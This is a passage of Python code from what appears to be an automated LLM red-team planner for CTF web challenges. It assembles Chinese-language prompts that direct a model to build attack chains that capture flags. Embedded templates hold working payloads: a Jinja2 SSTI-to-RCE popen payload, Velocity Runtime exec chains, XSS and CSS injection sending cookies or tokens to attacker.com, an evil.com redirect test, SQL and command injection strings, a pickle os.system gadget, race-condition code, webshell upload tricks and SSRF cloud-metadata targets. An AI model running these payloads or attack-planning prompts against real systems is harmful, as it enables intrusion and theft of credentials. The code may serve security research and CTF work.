    endpoints: list[str] = []

    route_re = re.compile(r"""@(\w+)\.route\(['\"](/[\w/<>-]*)['\"]""")
    url_re = re.compile(r"""(?:POST|GET|PUT|DELETE|PATCH)\s+(/\S+)""")
    path_re = re.compile(r"""/[\w.-]*(?:api|challenge|login|register|profile|upload|download|report|add(?:Item|Contract|Product)|sendVerification|product|admin|contract|verify|settings|home|external|logout|static|user|auth|file|image|comment|post|search|query|admin|api|rest|graphql|ws|socket)[\w/<>?&=._-]*""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
            file_path = evidence.get("file", "")
        else:
            code = str(evidence)
            file_path = ""

        attack_chain = vuln.get("attack_chain", "")
        data_flow = vuln.get("data_flow", "")
        description = vuln.get("description", "")

        all_text = f"{code} {attack_chain} {data_flow} {description} {file_path}"

        for match in route_re.findall(all_text):
            bp_name, ep = match
            ep = ep.strip()
            prefix = prefixes.get(bp_name, "")
            full = prefix + ep if prefix else ep
            if full not in seen:
                seen.add(full)
                endpoints.append(full)

        for match in url_re.findall(all_text):
            ep = match.strip()
            if ep not in seen:
                seen.add(ep)
                endpoints.append(ep)

        for match in path_re.findall(all_text):
            ep = match.strip()
            if "?" in ep:
                ep = ep.split("?")[0]
            ep = ep.rstrip("/. ")
            if not ep or ep in seen:
                continue
            if re.search(r"\.(py|html|js|css|c|h|txt|md)$", ep):
                continue
            if re.search(r"/(application|blueprints|templates|static|config|middleware|database|util|bot|email|release|node_modules|vendor)/", ep):
                continue
            if re.search(r"(cybench_web_challenges|target_codebase)", ep):
                continue
            if ep in ("/contracts", "/challenge", "/"):
                continue
            seen.add(ep)
            endpoints.append(ep)

    for ep in list(endpoints):
        if prefixes and not any(ep.startswith(p) for p in prefixes.values()):
            default_prefix = next(iter(prefixes.values()))
            resolved = default_prefix + ep
            if resolved not in seen:
                seen.add(resolved)
                endpoints.append(resolved)

    return [ep for ep in endpoints if ep.startswith("/")]


def _build_vuln_table(vulns: list[dict[str, Any]]) -> str:
    lines = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")
        cwe = v.get("cwe_id", "?")
        severity = v.get("severity", "?")
        source = v.get("source", "")
        sink = v.get("sink", "")
        lines.append(
            f"  [{severity}] {vid} | {cwe} | {title}\n"
            f"    攻击面: {source} -> {sink}"
        )
    return "\n".join(lines)


def _build_evidence_extracts(vulns: list[dict[str, Any]]) -> str:
    parts = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")

        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            file = evidence.get("file", "")
            lines_info = evidence.get("lines", "")
            code = evidence.get("code_snippet", "")
        else:
            file = ""
            lines_info = ""
            code = str(evidence)

        attack_chain = v.get("attack_chain", "")
        data_flow = v.get("data_flow", "")
        source = v.get("source", "")
        sink = v.get("sink", "")
        description = v.get("description", "")

        block_parts = [f"## {vid}: {title}"]
        if file:
            block_parts.append(f"文件: {file} (行 {lines_info})")
        block_parts.append(f"攻击面: source={source}, sink={sink}")
        if attack_chain:
            block_parts.append(f"攻击链: {attack_chain}")
        if data_flow:
            block_parts.append(f"数据流: {data_flow}")
        if description:
            block_parts.append(f"描述: {description}")
        if code:
            block_parts.append(f"漏洞代码:\n```\n{code}\n```")

        parts.append("\n".join(block_parts))

    return "\n\n".join(parts)


def _build_cwe_templates_generic(cwe_set: set[str]) -> str:
    templates = []

    if "CWE-94" in cwe_set or "CWE-917" in cwe_set:
        templates.append("""
【SSTI/模板注入攻击模板（CWE-94/CWE-917）— 通用版】：
常见触发点：邮件渲染、页面模板、PDF生成、日志记录
常见框架：Jinja2 (Flask/Django), Twig (PHP), ERB (Ruby), Freemarker (Java), Velocity (Java)

基础探测payload（验证SSTI是否存在）：
{{7*7}}  → 期望输出 49
${7*7}   → 期望输出 49（Freemarker）
#{7*7}   → 期望输出 49（Thymeleaf）

Jinja2 SSTI→RCE payload示例（根据实际注入点调整参数名）：
import requests,urllib3,json; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
r=requests.post(f'{base}{INJECTION_ENDPOINT}', data={'EMAIL_FIELD':payload+'@x.com','OTHER_FIELDS':'values'}, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+json.dumps({'status':r.status_code,'body':r.text[:300]}))

注意：
- SSTI执行结果通常不会直接返回给攻击者！需要配合其他漏洞（如XSS、文件写入、外带DNS）获取结果
- 根据证据中的 attack_chain 确认具体的注入点和触发路径
- 如果目标有邮件发送功能，SSTI可能在邮件渲染时触发

═══════════════ ★ SSTI 渐进验证强制规则（Progressive Verification）★ ═══════════════
【🔴 这是硬约束！检测到 SSTI 时必须按以下顺序逐步验证，每步确认成功后才能进入下一步，禁止跳级！】

Step 1 — 算术验证（已知成功则跳过）：
  Jinja2:   {{7*7}} → 期望返回 49
  Velocity:  #set($x=7*7)$x → 期望返回 49
  Freemarker: ${7*7} → 期望返回 49
  print() 验证：resp.text 中是否包含 "49"

Step 2 — 对象访问验证：
  Jinja2:   {{config}} 或 {{self}} → 期望返回非空对象引用
  Velocity:  $class → 期望返回非空对象引用
  判断标准：resp.text 不为空且不是纯数字

Step 3 — 方法调用验证：
  Jinja2:   {{config.__class__}} → 期望返回类名
  Velocity:  $class.getName() → 期望返回类名字符串
  判断标准：resp.text 中存在类名/类型字符串

Step 4 — ClassLoader 验证（Java框架）：
  Velocity:  $class.getClassLoader() → 期望返回非空
  判断标准：resp.text 不为空

Step 5 — Runtime 获取：
  Jinja2:   {{config.__class__.__init__.__globals__['os']}}
  Velocity:  $class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)
  判断标准：resp.text 中包含 Runtime 对象信息

Step 6 — 命令执行验证（用无害命令）：
  执行 id 或 whoami，确认有回显再读 flag
  Jinja2:   popen('id').read() 或 popen('whoami').read()
  Velocity:  Runtime.getRuntime().exec("id")
  print() 验证：resp.text 或 stdout 中是否有 uid= / username=

Step 7 — flag 读取：
  确认命令执行有回显后：cat /flag 或 find / -name flag* 2>/dev/null
  print() 验证：是否读取到 flag 内容

【🔴 逐级检查规则】：
  1. 每个 step 只能推进一级（Step N→Step N+1），禁止跨级跳步
  2. 当前级未通过 → 下一轮必须重试同级的变异 payload，禁止跳到下一级
  3. 每轮 Planner 必须在 step 的 purpose 字段中声明目标 Step 级别
  4. 每步末尾必须 print(f"[SSTI_STAGE] Stage=N result={{resp.text[:300]}}")
  5. Evaluator 会检查 [SSTI_STAGE] 标记判定是否允许推进
  6. 已知成功的 Step 可以在本轮跳过，从第一个未确认的 Step 开始

Velocity SSTI 特别说明：
- Velocity 模板执行结果会直接反射在 HTTP 响应体中
- 不需要 OOBReceiver 做带外回调
- 验证命令执行时，直接检查响应体是否包含命令输出
- 例如执行 id 命令，响应体里应出现 uid= 字样
- 例如读取 /flag，响应体里应直接出现 flag 内容
- 禁止在 Velocity SSTI 利用链中使用 OOBReceiver
""")

    if "CWE-79" in cwe_set:
        templates.append("""
【XSS/CSS注入攻击模板（CWE-79）— 通用版】：
分类与利用场景：

1. 存储型XSS（持久化）：
   - 用户资料、评论、商品描述等存储后由其他用户/管理员查看的字段
   - Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
   - 或 <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

2. CSS注入（属性选择器数据外带）：
   - 当页面包含敏感值在HTML元素中时（如<input value="SECRET">）
   - 利用CSS属性选择器逐字符泄露：
     input[value^="a"] { background:url(https://attacker.com/char?a) }
     input[value^="ab"] { background:url(https://attacker.com/prefix?ab) }
   - 匹配成功时浏览器自动发起请求，逐字符泄露token/secret

3. DOM-based XSS：
   - 危险函数：innerHTML, document.write(), eval(), setTimeout(), location.hash
   - 寻找未过滤的用户输入直接插入DOM的位置

4. Service Worker注入：
   - 如果应用注册了SW且SW源可控制，可劫持所有网络请求
   - 注入恶意SW后可拦截/修改请求、窃取cookie

通用利用流程：
Step 1 - 注入payload到可存储字段
Step 2 - 触发管理员/Bot访问含payload的页面（report功能、分享链接等）
Step 3 - 在attacker服务器接收窃取的数据（cookie/token/session）
Step 4 - 用窃取的凭证进行权限提升操作
""")

    if "CWE-352" in cwe_set:
        templates.append("""
【CSRF保护绕过策略（CWE-352）— 通用版】：
常见CSRF保护机制及绕过方法：

1. Token验证（Referer/Origin检查）：
   - 绕过：如果token可通过XSS/CSS注入获取，则可构造完整CSRF请求
   - 绕过：如果token验证不严格（接受空值、任意值）

2. SameSite Cookie：
   - Strict: 完全阻止跨站（最难绕过）
   - Lax: GET请求可跨站（可结合开放重定向）
   - None: 无保护（需Secure标志+HTTPS）

3. JWT中的CSRF token：
   - 如果JWT存储在非HttpOnly cookie中，JS可读取
   - 通过XSS/CSS提取JWT内的CSRF token
   - 用提取的token构造合法请求

通用绕过思路：
A - 先通过其他漏洞（XSS/CSS注入）获取CSRF token
B - 分析token生成逻辑，尝试预测/伪造
C - 寻找无需token的API端点（遗漏）
D - 如果是双token机制（cookie+header），尝试只满足其中一个
""")

    if "CWE-362" in cwe_set:
        templates.append("""
【竞态条件利用策略（CWE-362）— 通用版】：
典型场景：
- 文件上传：TOCTOU（Time of Check to Time of Use）竞争
- 权限变更：先检查后更新的非原子操作
- 资源分配：并发请求抢夺同一资源
- 状态转换：支付/审批等多状态系统的状态竞争

通用利用框架（Python threading）：
import requests,urllib3,json,threading,time; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
s=requests.Session(); s.verify={VERIFY_FLAG}
results=[]; errors=[]
def race_request(payload_data, label):
    try: r=s.post(f'{base}{RACE_ENDPOINT}', data=payload_data, cookies=s.cookies); results.append((label,r.status_code,r.text[:200]))
    except Exception as e: errors.append(str(e))
threads=[threading.Thread(target=race_request, args=(data1,'req1')), thread.Thread(target=race_request, args=(data2,'req2'))]
[t.start() for t in threads]; [t.join() for t in threads]
print('###CHAIN_OUTPUT###'+json.dumps({'results':results,'errors':errors}))

关键要点：
- 并发线程数通常10-50个，取决于TOCTOU窗口大小
- 两个请求的参数必须有冲突（一个合法一个越权）
- 需要多次循环尝试（竞态窗口可能只有毫秒级）
- 成功标志：返回结果中出现越权操作的痕迹
""")

    if "CWE-434" in cwe_set:
        templates.append("""
【文件上传漏洞利用（CWE-434）— 通用版】：
常见攻击向量：

1. 路径遍历（../../../）：
   - filename参数注入 ../ 写入任意位置
   - 目标：webshell (.php/.jsp/.asp)、配置文件覆盖、cron job

2. 文件类型伪造：
   - Magic bytes伪造：%PDF- (PDF), GIF89a (GIF), PK\\x03\\x04 (ZIP)
   - 双扩展名：shell.php.jpg (配合Apache解析漏洞)
   - Null字节截断：shell.php%00.jpg (旧版本)

3. 元数据/头信息注入：
   - ExifTool处理的JPEG/PDF可注入命令
   - SVG文件内嵌JavaScript
   - Office宏（.docm/.xlsm）

4. 存储型XSS via文件名：
   - 文件名反射到HTML时未转义

通用测试流程：
Step 1 - 上传正常文件确认功能可用
Step 2 - 尝试magic bytes伪造（%PDF-开头+恶意内容）
Step 3 - 尝试路径遍历（filename=../../evil.php）
Step 4 - 尝试元数据注入（如果有ExifTool/ImageMagick处理）
Step 5 - 如果有解析/预览功能，尝试对应格式的RCE
""")

    if "CWE-601" in cwe_set:
        templates.append("""
【开放重定向利用（CWE-601）— 通用版】：
测试方法：修改url/redirect/next/target/callback参数为外部域名
import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
r=requests.get(f'{base}{REDIRECT_ENDPOINT}?url=https://evil.com', allow_redirects=False, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+str({'status':r.status_code,'location':r.headers.get('Location')}))
利用场景：钓鱼攻击、窃取OAuth token、绕过referer检查
""")

    if "CWE-89" in cwe_set:
        templates.append("""
【SQL注入攻击模板（CWE-89）— 通用版】：
快速验证：' OR '1'='1' -- / " OR "1"="1
自动化工具：sqlmap -u "URL" --batch --level=2 --risk=2 [--force-ssl]
手动注入流程：
1. 确定注入点（参数/Headers/Cookie）
2. 判断数据库类型（报错差异/注释符/内置函数）
3. 确定字段数（ORDER BY 1,2,3...）
4. 获取数据库名/表名/列名
5. 提取敏感数据（credentials/flags）
""")

    if "CWE-78" in cwe_set:
        templates.append("""
【命令注入策略（CWE-78）— 通用版】：
分隔符：; & && | || $() ` \\n %0a %0d
测试payload：;whoami / $(whoami) / `whoami` / | whoami
盲注技巧：sleep 5 / ping -c 5 attacker.com（时间侧信道）
""")

    if "CWE-502" in cwe_set:
        templates.append("""
【反序列化攻击模板（CWE-502）— 通用版】：
Pickle (Python)：pickle.dumps((os.system,('cmd',)))
Java: ysoserial生成gadget链
PHP: unserialize() + POP chain
注意：反序列化通常需要知道目标使用的库版本以构造正确的gadget链
""")

    if "CWE-918" in cwe_set:
        templates.append("""
【SSRF攻击策略（CWE-918）— 通用版】：
⚠️ 以下为 SSRF 注入载荷（注入到目标请求参数中，由目标服务器代发），不是你自己脚本的连接目标！
内网探测：127.0.0.1:6379(Redis), localhost:3306(MySQL), localhost:8080
云元数据：169.254.169.254(AWS/GCP/Azure)
绕过WAF：十进制IP(2130706433=127.0.0.1)、短URL重定向、DNS rebinding
🔴 你自己的脚本始终使用 target_base 动态变量连接目标，禁止硬编码 localhost/127.0.0.1！
""")

    if templates:
        return "\n".join([
            "【CWE专项攻击模板 — 通用版】（以下模板适用于各类CTF/Web安全题目，请根据实际目标调整{TARGET_BASE_URL}和{INJECTION_ENDPOINT}等占位符）：",
            *templates,
        ])
    return ""


_NO_AVAILABLE_STRATEGY_BLOCK = """[NO_AVAILABLE_STRATEGY_FOR_SURFACE]
All known strategies for the current surface are empirically rejected.
Do not generate same-family payloads.
Request a new strategy or switch surface."""

_UNVERIFIED_BOOTSTRAP_BLOCK = """[NO_MATCHED_TEMPLATE]
No YAML strategy matched the current surface. Generic CWE bootstrap execution is disabled.
Create a reviewed migration/suggestion task instead of emitting payload code."""


def _select_cwe_templates(vulns: list[dict[str, Any]], confirmed: dict[str, Any], state: str = "") -> TemplateSelectionResult:
    mgr = TemplateManager()
    strategy_health_resolver = None
    try:
        from control.hypothesis_tracker import get_hypothesis_tracker
        tracker = get_hypothesis_tracker()
        rejected = tracker.get_rejected_strategy_ids()
        strategy_health_resolver = lambda sid: tracker.evaluate_strategy_health(sid).to_dict()
    except Exception:
        rejected = set()

    selection = mgr.select_templates_for_target(
        confirmed,
        state=state,
        rejected_strategy_ids=rejected,
        strategy_health_resolver=strategy_health_resolver,
    )
    if selection.status == "AVAILABLE_STRATEGY":
        return selection
    if selection.status == "ALL_MATCHED_STRATEGIES_REJECTED":
        selection.text = _NO_AVAILABLE_STRATEGY_BLOCK
        return selection

    selection.text = _UNVERIFIED_BOOTSTRAP_BLOCK
    return selection


def _build_cwe_templates(vulns: list[dict[str, Any]], confirmed: dict[str, Any], state: str = "") -> str:
    return _select_cwe_templates(vulns, confirmed, state=state).text

# Task 2 — 硬核目标摘要提取器 (User Goal Truncation)
# 原始文本超过 _USER_GOAL_SOFT_LIMIT 时执行硬性正则提取，
# 仅保留核心三要素：端点、已知参数变量、沙箱边界规约。
# 其余叙述性散文、冗余说明在移交给 Planner 前物理剔除。
# ═══════════════════════════════════════════════════════════════════

_USER_GOAL_SOFT_LIMIT = 2500


def _build_cwe_aware_json_example(
    vulns: list[dict[str, Any]],
    injection_points: list[str],
    target_base: str,
    template_selection_status: str = "",
) -> str:
    """构建与当前 CWE 对齐的 JSON 输出示例，避免模型猜错格式。

    根据 CWE 类型选择不同的 payload 示例：
      - CWE-94 / SSTI / Template Injection → Velocity #set() payload
      - CWE-78 / CWE-77 / Command Injection → ; id payload
      - 其他 → 通用 HTTP 探测
    """
    # 提取 CWE 集合
    cwe_set: set[str] = set()
    for v in vulns:
        cwe = v.get("cwe_id", "").upper()
        if cwe:
            cwe_set.add(cwe)
        # 也检查 title 中的关键词
        title = (v.get("title") or "").lower()
        if "ssti" in title or "template" in title or "velocity" in title:
            cwe_set.add("CWE-94")

    # 提取第一个注入参数名
    param_name = "param"
    if injection_points:
        import re
        m = re.search(r'参数名:\s*(\w+)', injection_points[0])
        if m:
            param_name = m.group(1)

    if template_selection_status == "ALL_MATCHED_STRATEGIES_REJECTED":
        return f"""【JSON输出格式 — 必须严格遵守以下示例结构】

[NO_AVAILABLE_STRATEGY_FOR_SURFACE]
All known strategies for the current surface are empirically rejected.
Do not generate same-family payloads or concrete payload variants for this CWE.
Request a new strategy or switch surface.

{{
  "version": 1,
  "plan_id": "PLAN-001",
  "vuln_summary": "Current surface has no available known strategy",
  "rationale": "All matched YAML strategies for this surface are rejected; do not revive same-family payloads.",
  "attack_chain": "Request a new strategy or switch to a different surface",
  "steps": [
    {{
      "id": "step-1",
      "type": "python",
      "purpose": "Do not execute rejected same-family payloads; propose a new strategy family instead.",
      "command": "print('NO_AVAILABLE_STRATEGY_FOR_SURFACE')",
      "expected_outcome": "Planner must switch strategy or surface",
      "primitive": "strategy_switch",
      "why_this_primitive": "Known strategies for parameter {param_name} are empirically rejected"
    }}
  ]
}}
"""
    # 根据 CWE 选择 payload 和描述
    is_ssti = any(c in cwe_set for c in ("CWE-94", "CWE-917", "CWE-1336"))
    is_cmd_inj = any(c in cwe_set for c in ("CWE-77", "CWE-78"))

    if is_ssti:
        vuln_type = "SSTI/模板注入漏洞"
        summary = "Apache Velocity SSTI，可通过模板语法执行任意Java代码"
        rationale = "利用Velocity #set()指令逐步获取Runtime对象并执行系统命令"
        chain = "Step1: SSTI探测(算术表达式) → Step2: 反射获取Runtime → Step3: 执行命令读flag"
        purpose = "通过Velocity SSTI注入算术表达式 #set($x=7*7)$x 确认模板引擎解析"
        outcome = "响应中包含 49，确认SSTI漏洞存在"
        primitive = "template_injection"
        why_primitive = "模板注入是获取RCE的唯一入口"
        # Velocity SSTI 探测 payload — 多行 Python 包装
        command = (
            f"import json, urllib.parse\\n"
            f"from redteam_sdk import HttpClient\\n\\n"
            f"with open('/workspace/context.json') as f: ctx = json.load(f)\\n"
            f"target_base = ctx.get('target_context', {{}}).get('base_url', '')\\n"
            f"s = HttpClient(target_base)\\n\\n"
            f"payload = '#set($x=7*7)$x'\\n"
            f"encoded = urllib.parse.quote(payload)\\n"
            f"resp = s.get(f'/?{param_name}={{encoded}}')\\n"
            f"print(f'HTTP {{resp.status_code}}: {{resp.text[:500]}}')\\n"
            f"print('STEP_OK')"
        )
    elif is_cmd_inj:
        vuln_type = "命令注入漏洞"
        summary = "命令注入漏洞，可通过参数拼接系统命令"
        rationale = "选择 command 注入链，因为目标参数直接拼接 shell 命令"
        chain = "Step1: 信息探测 → Step2: 命令注入读取flag"
        purpose = "通过命令注入执行 id 命令确认漏洞存在"
        outcome = "响应中包含 uid= 字样，确认命令执行成功"
        primitive = "command_injection"
        why_primitive = "命令注入是获取 RCE 的唯一入口"
        command = (
            f"import json, urllib.parse\\n"
            f"from redteam_sdk import HttpClient\\n\\n"
            f"with open('/workspace/context.json') as f: ctx = json.load(f)\\n"
            f"target_base = ctx.get('target_context', {{}}).get('base_url', '')\\n"
            f"s = HttpClient(target_base)\\n\\n"
            f"payload = '; id'\\n"
            f"encoded = urllib.parse.quote(payload)\\n"
            f"resp = s.get(f'/?{param_name}={{encoded}}')\\n"
            f"print(f'HTTP {{resp.status_code}}: {{resp.text[:500]}}')\\n"
            f"print('STEP_OK')"
        )
    else:
        vuln_type = "Web漏洞"
        summary = "目标存在可利用漏洞"
        rationale = "先进行信息探测，确认目标响应特征后再构造精确攻击载荷"
        chain = "Step1: 信息探测 → Step2: 漏洞利用"
        purpose = "发送探测请求确认目标可达性和响应特征"
        outcome = "HTTP 200，确认目标可达"
        primitive = "information_disclosure"
        why_primitive = "信息探测是攻击链的起点"
        command = (
            f"import json\\n"
            f"from redteam_sdk import HttpClient\\n\\n"
            f"with open('/workspace/context.json') as f: ctx = json.load(f)\\n"
            f"target_base = ctx.get('target_context', {{}}).get('base_url', '')\\n"
            f"s = HttpClient(target_base)\\n\\n"
            f"resp = s.get('/')\\n"
            f"print(f'HTTP {{resp.status_code}}: {{resp.text[:500]}}')\\n"
            f"print('STEP_OK')"
        )

    return f"""【JSON输出格式 — 必须严格遵守以下示例结构】

你必须输出一个扁平的 JSON 对象。🔴 steps 必须是顶层字段，禁止包裹在 plan 或 attack_plan 里面！
每 step 的 command 字段必须包含完整的 Python 多行代码（禁止单行分号串联），末尾必须有 print('STEP_OK')。

===== 标准输出示例（直接拷贝此结构，替换内容）=====

{{
  "version": 1,
  "plan_id": "PLAN-001",
  "vuln_summary": "{summary}",
  "rationale": "{rationale}",
  "chain_design": "{chain}",
  "steps": [
    {{
      "id": "step-1",
      "status": "PLANNED",
      "type": "python",
      "purpose": "{purpose}",
      "expected_outcome": "{outcome}",
      "depends_on": [],
      "on_failure": "BLOCK_AND_DEBUG",
      "why_this_step_advances_state": "确认漏洞存在并建立初始原语",
      "why_this_payload_is_a_mutation": "首次探测，使用最小化载荷",
      "why_this_is_not_regression": "第一轮无历史回归风险",
      "target_primitive": "{primitive}",
      "why_this_primitive_advances_chain": "{why_primitive}",
      "command": "{command}"
    }}
  ],
  "history_state": {{
    "tried_payloads": [],
    "failed_reasons": [],
    "consecutive_failures_per_category": {{}},
    "forced_path_switch": ""
  }},
  "primitive_context": {{
    "current_primitive": null,
    "target_primitive": "{primitive}",
    "transition_edge": "",
    "fallback_primitive": ""
  }}
}}

===== 关键规则 =====
✅ 每 step 必须包含 command 字段，值为完整多行 Python 代码
✅ command 代码末尾必须打印 print('STEP_OK')
✅ HTTP 请求必须使用 redteam_sdk.HttpClient，禁止 import requests
✅ 禁止单行分号串联（如 a=1; b=2 会被拦截）
❌ 禁止输出 type="http" 或 method/path/params 字段（此格式已废弃）
❌ 禁止输出 imports 或 sdk_calls 数组（已废弃）
❌ 禁止在 command 中使用 import os/subprocess/socket（会被拦截）
❌ 禁止输出纯字符串 command（必须是可执行的 Python 代码）"""


def _extract_injection_point(vuln: dict[str, Any], evidence_list: list[dict]) -> dict[str, str]:
    """从 confirmed_vuln 的 source/sink/evidence 中提取注入点和 HTTP 方法+路径。

    返回 {"param": "text", "method": "GET", "path": "/"} 或空 dict。
    """
    import re

    def _ensure_str(val: Any) -> str:
        if isinstance(val, list):
            return "\n".join(str(line) for line in val)
        return str(val) if val else ""

    source_code = _ensure_str((vuln.get("source") or {}).get("code") or (vuln.get("source") or {}).get("code_snippet", ""))
    sink_code = _ensure_str((vuln.get("sink") or {}).get("code") or (vuln.get("sink") or {}).get("code_snippet", ""))

    # 1) 提取参数名：@RequestParam(name = "text") / req.getParameter("x") / $_GET['x'] 等
    param = ""
    for pattern in [
        r'@RequestParam\s*\([^)]*name\s*=\s*"([^"]+)"',
        r'@RequestParam\s*\(\s*"([^"]+)"',
        r'@RequestParam\s*\(\s*value\s*=\s*"([^"]+)"',
        r'(?:request|req)\.getParameter\s*\(\s*"([^"]+)"',
        r'\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'\$_POST\s*\[\s*[\'"]([^\'"]+)[\'"]',
        r'\$_REQUEST\s*\[\s*[\'"]([^\'"]+)[\'"]',
    ]:
        m = re.search(pattern, source_code)
        if m:
            param = m.group(1)
            break

    # 2) 提取 HTTP 方法和路径：扫描 source_code + evidence 中的注解
    method = "GET"
    path = "/"
    all_code = source_code + "\n" + sink_code
    for ev in (evidence_list or []):
        all_code += "\n" + _ensure_str(ev.get("code", ""))

    for pattern in [
        r'@(?:Get|Post|Put|Delete|Patch)?Mapping\s*\(\s*"([^"]*)"',
        r'@RequestMapping\s*\(\s*"([^"]*)"',
        r'@RequestMapping\s*\([^)]*value\s*=\s*"([^"]+)"',
        r'@RequestMapping\s*\([^)]*path\s*=\s*"([^"]+)"',
        r'@(?:Get|Post|Put|Delete|Patch)Mapping\s*\(\s*value\s*=\s*"([^"]+)"',
        r'@(?:Get|Post|Put|Delete|Patch)Mapping\s*\(\s*path\s*=\s*"([^"]+)"',
    ]:
        m = re.search(pattern, all_code)
        if m:
            path = m.group(1)
            break

    # 推断 HTTP method
    if re.search(r'@PostMapping', all_code):
        method = "POST"
    elif re.search(r'@PutMapping', all_code):
        method = "PUT"
    elif re.search(r'@DeleteMapping', all_code):
        method = "DELETE"
    elif re.search(r'@PatchMapping', all_code):
        method = "PATCH"
    else:
        method = "GET"

    if param:
        return {"param": param, "method": method, "path": path}
    return {}


def _extract_user_goal_dense(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None, state: str = "") -> str:
    """Build a high-density, minimal User Goal block from confirmed_vuln data.

    Only extracts: base_url, endpoints (top 20), CWE IDs + titles,
    and a minimal evidence summary (first 400 chars per vuln).
    Discards all narrative prose, verbose descriptions, and redundant rule text.
    """
    vulns = confirmed.get("vulnerabilities", [])
    target_context = confirmed.get("target_context", {})
    target_base = target_context.get("base_url", os.getenv("CO_REDTEAM_TARGET_BASE", ""))
    target_name = target_context.get("app_name", "目标应用")
    is_https = target_base.startswith("https://")

    prefixes = _discover_blueprint_prefixes(confirmed)
    endpoints = _extract_endpoints_from_vulns(vulns, prefixes)
    endpoints.sort()

    parts: list[str] = []
    parts.append(f"你是 Co-RedTeam 规划智能体。设计能拿到 flag 的完整攻击链。")
    parts.append(f"目标: {target_base} ({target_name}) — {'HTTPS' if is_https else 'HTTP'}")

    # ── 强制注入点（从 confirmed_vuln source 字段提取，Planner 必须使用）──
    injection_points: list[str] = []
    for v in vulns:
        evidence_list = v.get("evidence", [])
        if isinstance(evidence_list, dict):
            evidence_list = [evidence_list]
        ip = _extract_injection_point(v, evidence_list)
        if ip:
            cwe = v.get("cwe_id", "UNKNOWN")
            title = v.get("title", "")
            full_url = f"{target_base.rstrip('/')}{ip['path']}?{ip['param']}=<PAYLOAD>"
            ip_line = (
                f"🔥 强制注入点（必须使用）: {ip['method']} {full_url}\n"
                f"   参数名: {ip['param']}  路径: {ip['path']}  方法: {ip['method']}  CWE: {cwe}\n"
                f"   漏洞: {title}\n"
                f"   ⚠️ 所有攻击步骤必须通过此参数注入 payload！不得使用裸 GET / ！"
            )
            injection_points.append(ip_line)

    if injection_points:
        parts.append("【关键注入点 — 以下注入参数是强制性的，忽略将导致攻击失败】\n" + "\n".join(injection_points))
    else:
        parts.append("【关键注入点】未从 confirmed_vuln 提取到注入参数，请从 source.code 手动确定注入点！")

    # ── 端点密炼（最多 20 条）──
    if endpoints:
        ep_lines = [f"  {ep}" for ep in endpoints[:20]]
        if len(endpoints) > 20:
            ep_lines.append(f"  ... (+{len(endpoints) - 20} more)")
        parts.append(f"端点 ({len(endpoints)} 条):\n" + "\n".join(ep_lines))

    # ── 漏洞密炼（CWE + title + 最小证据）──
    vuln_lines: list[str] = []
    for v in vulns:
        vid = v.get("id", "?")
        cwe = v.get("cwe_id", "?")
        title = v.get("title", "?")
        severity = v.get("severity", "?")
        source = v.get("source", "")
        sink = v.get("sink", "")

        # Extract minimal evidence: first 300 chars of code snippet
        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")[:300]
        else:
            code = str(evidence)[:300]
        code_compact = code.replace("\n", "\\n").replace("\t", " ")

        vline = f"[{severity}] {cwe} {title} | {source}→{sink}"
        if code_compact.strip():
            vline += f" | 证据: {code_compact}"
        vuln_lines.append(vline)
    parts.append("漏洞:\n" + "\n".join(vuln_lines))

    # ── Blueprint 前缀 ──
    if prefixes:
        bp_str = "; ".join(f"{name}→{pref}" for name, pref in sorted(prefixes.items()))
        parts.append(f"蓝图前缀: {bp_str}")

    # ── 挑战适配器规则 ──
    challenge_rules = ""
    if adapter is not None:
        challenge_rules = adapter.extra_rules()

    # ── JSON 输出格式要求（动态匹配当前 CWE，防止模型猜错）──
    template_selection = _select_cwe_templates(vulns, confirmed, state=state)
    _json_example = _build_cwe_aware_json_example(
        vulns,
        injection_points,
        target_base,
        template_selection_status=template_selection.status,
    )
    parts.append(_json_example)

    core = "\n\n".join(parts)

    # ── 追加 CWE 模板和公共规则（但限制体积）──
    cwe_templates = template_selection.text
    if cwe_templates:
        core += f"\n\n【CWE模板】\n{_physical_truncate(cwe_templates, 600)}"

    if challenge_rules:
        core += f"\n{challenge_rules[:500]}"

    return core


def build_dynamic_prompt(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None, state: str = "") -> str:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return "你是 Co-RedTeam 规划智能体。\n" + _COMMON_RULES

    target_context = confirmed.get("target_context", {})
    target_base = target_context.get("base_url", os.getenv("CO_REDTEAM_TARGET_BASE", ""))

    if not target_base:
        return (
            "【严重配置错误】目标基础 URL 为空！\n"
            "请在 confirmed_vuln.json 的 target_context.base_url 字段指定目标地址，"
            "或设置环境变量 CO_REDTEAM_TARGET_BASE。\n"
            "例如：设置环境变量 CO_REDTEAM_TARGET_BASE=https://真实IP:端口 或在 CLI 使用 --url 参数\n"
            "无法生成攻击计划，请先修复配置后再运行。"
        )

    target_name = target_context.get("app_name", "目标应用")
    
    is_https = target_base.startswith("https://")
    protocol_hint = f"\n【协议检测】：目标使用 {'HTTPS (SSL/TLS)' if is_https else 'HTTP (明文)'}，所有请求必须使用 {'https://' + ('加 verify=False 参数' if is_https else '') if is_https else 'http://' + ('不需要 verify=False' if not is_https else '')}"

    prefixes = _discover_blueprint_prefixes(confirmed)
    endpoints = _extract_endpoints_from_vulns(vulns, prefixes)

    discovered_routes = target_context.get("discovered_routes", [])
    if discovered_routes:
        route_re = re.compile(r"""@(\w+)\.route\('([^']*)'\)""")
        for raw in discovered_routes:
            m = route_re.search(raw)
            if m:
                bp_name, ep = m.group(1), m.group(2)
                prefix = prefixes.get(bp_name, "")
                full = prefix + ep if prefix else ep
